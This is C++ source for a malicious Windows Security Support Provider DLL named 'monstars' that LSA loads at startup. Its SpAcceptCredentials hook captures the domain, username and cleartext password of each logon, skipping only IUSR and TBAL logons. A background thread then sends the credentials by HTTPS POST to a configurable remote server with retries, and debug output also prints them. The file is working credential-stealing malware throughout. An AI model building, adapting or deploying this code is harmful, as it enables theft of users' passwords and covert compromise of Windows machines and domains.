#define SECURITY_WIN32
#include <Windows.h>
#include <stdint.h>
#include <errno.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>

#include "bang_helpers.h"
#include "bang_http.h"

#define STATUS_SUCCESS 0;

constexpr SEC_WCHAR c_PackageName[] = L"monstars";
constexpr SEC_WCHAR c_PackageComment[] = L"welcome to the jam!";
constexpr ULONG c_PackageCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
constexpr USHORT c_PackageVersion = 1337;

SECPKG_FUNCTION_TABLE g_SecurityPackageFunctionTable = {};

HANDLE g_SendMutex = nullptr;
FILETIME g_LastAuthTime = {};
wchar_t g_LastAuthUser[MAX_PATH] = {};

constexpr wchar_t c_BangHttpsEndpoint[] = L"bang/log/";
constexpr uint64_t c_ReauthCooldown = 5 * 1000 * 1000 * 10;  // 5 seconds, in 10ns units
constexpr uint32_t c_ConnectAttempts = 5;
constexpr uint32_t c_RetryInterval = 30 * 1000;  // 30 seconds, in milliseconds
constexpr wchar_t c_IUSR[] = L"IUSR";  // IUSR anonymous account name
constexpr wchar_t c_TBAL[] = L"_TBAL_{68EDDCF5-0AEB-4C28-A770-AF5302ECA3C9}";  // TBAL/ARSO password

// stampable values - configured via web interface or helper script
constexpr wchar_t c_BangHttpsHostname[MAX_PATH] = L"EVERYBODYGETUP";
constexpr wchar_t c_BangAuthToken[] = L"00000000-0000-0000-0000-000000000000";

NTSTATUS
NTAPI
SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    DEBUG_PRINTW(L"SpInitialize called for domain: %s\n", Parameters->DomainName.Buffer);

    return STATUS_SUCCESS;
}

NTSTATUS
NTAPI
SpShutdown(void)
{
    DEBUG_PRINTW(L"SpShutdown called\n");

    return STATUS_SUCCESS;
}

NTSTATUS
NTAPI
SpGetInfo(SecPkgInfoW* PackageInfo)
{
    DEBUG_PRINTW(L"SpGetInfo called\n");

    PackageInfo->Name = const_cast<SEC_WCHAR*>(c_PackageName);
    PackageInfo->Comment = const_cast<SEC_WCHAR*>(c_PackageComment);
    PackageInfo->fCapabilities = c_PackageCapabilities;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = c_PackageVersion;

    return STATUS_SUCCESS;
}

DWORD SendCredsAsync(bang::Creds* creds)
{
    uint32_t attempts = c_ConnectAttempts;
    do
    {
        // scoped lock
        {
            bang::MutexLock lock(g_SendMutex, 300000);  // 5 minute timeout
            if (!lock)
            {
                DEBUG_PRINTW(L"lock timeout, this is probably bad\n");
            }
            else
            {
                bang::HttpClient bang_client(c_BangHttpsHostname, c_BangHttpsEndpoint, c_BangAuthToken);
                if (bang_client.SendCreds(creds->Domain, creds->User, creds->Password))
                {
                    DEBUG_PRINTW(L"bang!\n");
                    goto cleanup;
                }
                if (bang_client.Forbidden())
                {
                    DEBUG_PRINTW(L"server denied request!\n");
                    goto cleanup;
                }
                DEBUG_PRINTW(L"connection failed, retrying after wait\n")
            }
        }
        if (--attempts) Sleep(c_RetryInterval);
    } while (attempts);

    DEBUG_PRINTW(L"failed to send creds after %ld attempts\n", c_ConnectAttempts);

cleanup:

    HeapFree(bang::g_Heap, 0, creds);
    return ERROR_SUCCESS;  // not checked anywhere, doesn't matter
}

NTSTATUS
NTAPI
SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    DEBUG_PRINTW(L"SpAcceptCredentials called\n");

    // ignore IUSR anonymous user and TBAL/ARSO authentication
    if (lstrcmpW(AccountName->Buffer, c_IUSR) &&
        lstrcmpW(PrimaryCredentials->Password.Buffer, c_TBAL))
    {
        // SpAcceptCredentials seems to be called twice per authentication
        //   - add a cooldown to avoid redundant POST requests
        FILETIME time;
        GetSystemTimeAsFileTime(&time);
        if ((time.dwLowDateTime - g_LastAuthTime.dwLowDateTime > c_ReauthCooldown)
            || lstrcmpW(AccountName->Buffer, g_LastAuthUser))
        {
            g_LastAuthTime = time;
            bang::memset(g_LastAuthUser, 0, sizeof(g_LastAuthUser));
            bang::memcpy(g_LastAuthUser, sizeof(g_LastAuthUser), AccountName->Buffer, AccountName->Length);

            if (bang::g_Heap)
            {
                // freed in helper thread
                auto creds = reinterpret_cast<bang::Creds*>(HeapAlloc(bang::g_Heap, HEAP_ZERO_MEMORY, sizeof(bang::Creds)));
                if (creds)
                {
                    bang::memcpy(creds->Domain, sizeof(creds->Domain), PrimaryCredentials->DomainName.Buffer,
                        PrimaryCredentials->DomainName.Length);
                    bang::memcpy(creds->User, sizeof(creds->User), AccountName->Buffer, AccountName->Length);
                    bang::memcpy(creds->Password, sizeof(creds->Password), PrimaryCredentials->Password.Buffer,
                        PrimaryCredentials->Password.Length);

                    DEBUG_PRINTW(L"%s\\%s:%s\n", creds->Domain, creds->User, creds->Password);
                    if (HANDLE thread =
                        CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SendCredsAsync), creds, 0, NULL))
                    {
                        CloseHandle(thread);
                    }
                }
            }
        }
    }

    return STATUS_SUCCESS;
}

// SpLsaModeInitialize is called by LSA for each registered Security Package
extern "C"
__declspec(dllexport)
NTSTATUS
NTAPI
SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    DEBUG_PRINTW(L"SpLsaModeInitialize called\n");

    g_SecurityPackageFunctionTable.Initialize = SpInitialize;
    g_SecurityPackageFunctionTable.Shutdown = SpShutdown;
    g_SecurityPackageFunctionTable.GetInfo = SpGetInfo;
    g_SecurityPackageFunctionTable.AcceptCredentials = SpAcceptCredentials;

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = &g_SecurityPackageFunctionTable;
    *pcTables = 1;

    return STATUS_SUCCESS;
}

extern "C"
BOOL
WINAPI
DllMain(HINSTANCE hInstance, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(reserved);

    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        DEBUG_PRINTW(L"process attach\n");
        bang::g_Heap = HeapCreate(0, 0, 0);
        g_SendMutex = CreateMutexW(nullptr, false, nullptr);
        break;
    case DLL_PROCESS_DETACH:
        DEBUG_PRINTW(L"process detach\n");
        if (bang::g_Heap) HeapDestroy(bang::g_Heap);
        if (g_SendMutex) CloseHandle(g_SendMutex);
        break;
    default:
        break;
    }

    return TRUE;
}